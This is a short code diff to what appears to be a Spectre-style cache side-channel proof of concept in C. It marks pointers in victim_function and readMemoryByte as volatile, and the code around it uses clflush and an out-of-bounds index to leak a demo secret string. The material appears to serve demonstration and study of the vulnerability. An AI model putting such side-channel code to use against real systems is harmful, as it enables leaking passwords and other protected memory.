@@ -40,7 +40,7 @@ uint8_t bigArray[4096*512];
 char secret[] = "The password is rootkea";
 uint8_t temp[50]; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_function(uint8_t* addressToWriteTo) {
+void victim_function(volatile uint8_t* addressToWriteTo) {
   
     *addressToWriteTo = 'P';
 
@@ -77,7 +77,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 
     addr = &bigArray[malicious_x];
-    uint8_t* addressOfSecret = (uint8_t*)&secret[0];
+    volatile uint8_t* addressOfSecret = (uint8_t*)&secret[0];
     for (j = 29; j >= 0; j--) {
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
         
